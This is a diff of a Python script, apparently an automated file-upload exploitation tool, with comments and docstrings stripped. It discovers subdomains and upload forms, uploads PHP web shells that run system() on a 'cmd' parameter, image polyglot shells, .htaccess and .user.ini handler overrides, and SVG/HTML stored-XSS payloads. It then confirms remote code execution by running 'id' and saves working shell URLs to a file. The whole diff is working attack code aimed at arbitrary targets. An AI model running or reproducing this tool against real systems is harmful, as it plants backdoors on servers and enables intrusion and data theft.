@@ -1,15 +1,4 @@
 #!/usr/bin/env python3
-"""
-ShellUploadHunter v5  -  strict, execution-proven upload RCE finder
-
-    python3 script.py target.com -o shells.txt
-
-Every URL written to -o is re-proven at the end with fresh random
-arithmetic + `id`, so a stored file, a soft-404 page, or a reflected
-query string can never be reported as a shell.
-
-pip install requests
-"""
 
 import argparse
 import base64
@@ -40,7 +29,6 @@ UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
 MARKER = "mk" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 
-# =====================================================================
 class Cfg:
     timeout = 12
     tls_verify = False
@@ -105,9 +93,6 @@ def post(s, url, **kw):
     return _req(s, "POST", url, **kw)
 
 
-# =====================================================================
-#  SUBDOMAINS
-# =====================================================================
 BUILTIN_WORDS = """
 www mail ftp admin portal dev development staging stage test testing qa uat
 prod production api api1 api2 app apps blog shop store cdn static img images
@@ -243,14 +228,10 @@ def is_live(host):
     return None
 
 
-# =====================================================================
-#  PAYLOADS  (unique filename per run -> no stale-file false positives)
-# =====================================================================
 RID = "".join(random.choices(string.ascii_lowercase, k=5))
 
 
 def _php(m):
-    # marker echo + math echo + command exec, all through one param
     return ('<?php '
             f'echo "{m}"; '
             'if(isset($_REQUEST["cmd"])){$c=$_REQUEST["cmd"];echo "##";system($c);echo "##";} '
@@ -290,7 +271,7 @@ def _html(m):
 def payloads(m):
     p = _php(m)
     png, gif, jpg = _png() + b"\n" + p, _gif() + b"\n" + p, _jpg() + b"\n" + p
-    n = lambda s: f"{RID}{s}"   # noqa: E731  unique base name
+    n = lambda s: f"{RID}{s}"   
     return [
         (n(".php"),        p,     "php"),
         (n(".PHP"),        p,     "php"),
@@ -317,7 +298,7 @@ def payloads(m):
         (n(".jpg"),        jpg,   "poly"),
         (".htaccess", b"AddType application/x-httpd-php .png .gif .jpg .svg .txt\n"
                       b"AddHandler application/x-httpd-php .png .gif .jpg\n", "htaccess"),
-        (".user.ini",  None, "userini"),          # built after png name is known
+        (".user.ini",  None, "userini"),        
         (n(".svg"),        _svg(m), "svg"),
         (n(".html"),       _html(m), "html"),
     ]
@@ -344,9 +325,6 @@ FALLBACK_FIELDS = ["file", "upload", "image", "userfile", "Filedata",
                    "filedata", "photo", "avatar", "attachment", "img"]
 
 
-# =====================================================================
-#  ENDPOINT DISCOVERY
-# =====================================================================
 FORM_RE = re.compile(rb"<form\b.*?</form>", re.I | re.S)
 INPUT_RE = re.compile(rb"<input\b[^>]*>", re.I)
 ENCTYPE_RE = re.compile(rb'enctype\s*=\s*["\']multipart/form-data["\']', re.I)
@@ -487,15 +465,7 @@ def _soft404(sess, ep):
 
 
 def prove(sess, url, payload=None, baseline=None):
-    """
-    Returns (user_string, reason). user_string truthy == PROVEN RCE.
-    Proof chain:
-      1. HTTP 200, no redirect away from the file
-      2. body is not the raw uploaded file (not static hosting)
-      3. no PHP source leak
-      4. two different random products are computed by the server
-      5. `id` returns a real uid
-    """
+
     r = get(sess, url)
     if r is None:
         return None, "unreachable"
@@ -571,10 +541,6 @@ def locate(sess, ep, name, resp, content, baseline):
             return c
     return None
 
-
-# =====================================================================
-#  ATTACK
-# =====================================================================
 def attack(base, results, lock):
     sess = make_session()
     eps = discover(sess, base)
@@ -596,7 +562,6 @@ def attack(base, results, lock):
             for name, content, kind in payloads(MARKER):
                 tag = f"{ep['action']} [{field}]"
 
-                # ---- .user.ini needs the png name first
                 if kind == "userini":
                     png_name = RID + ".png"
                     ini = f"auto_prepend_file={png_name}\nallow_url_include=On\n".encode()
@@ -623,7 +588,6 @@ def attack(base, results, lock):
                             break
                     break
 
-                # ---- server config abuse
                 if kind == "htaccess":
                     if upload(sess, ep, ".htaccess", content, field) is None:
                         continue
@@ -647,7 +611,6 @@ def attack(base, results, lock):
                         break
                     continue
 
-                # ---- client-side content
                 if kind in ("svg", "html"):
                     r = upload(sess, ep, name, content, field)
                     if r is None:
@@ -664,7 +627,6 @@ def attack(base, results, lock):
                             print(f"      [STORED-XSS] {u} <- {name}")
                     continue
 
-                # ---- php candidates
                 r = upload(sess, ep, name, content, field)
                 if r is None:
                     continue
@@ -689,9 +651,6 @@ def attack(base, results, lock):
                     print(f"      [POLYGLOT] {u} <- {name} ({why})")
 
 
-# =====================================================================
-#  MAIN
-# =====================================================================
 def normalize(t):
     t = t.strip().lower().replace("http://", "").replace("https://", "")
     return t.split("/")[0].split("?")[0]
@@ -781,7 +740,6 @@ def main():
     with cf.ThreadPoolExecutor(max_workers=max(1, args.threads // 2)) as ex:
         list(ex.map(lambda b: attack(b, results, lock), live))
 
-    # ---------- FINAL RE-PROOF PASS -------------------------------
     rce = [r for r in results if r["type"] == "rce"]
     print(f"\n[*] re-proving {len(rce)} candidate shell(s) ...")
     verified = []
@@ -798,7 +756,6 @@ def main():
             print(f"    [DROP] {r['url']}  ({why})")
     others = [r for r in results if r["type"] != "rce"]
 
-    # ---------- REPORT --------------------------------------------
     verified.sort(key=lambda r: r["url"])
     mode = "a" if args.append else "w"
     with open(args.output, mode) as f:
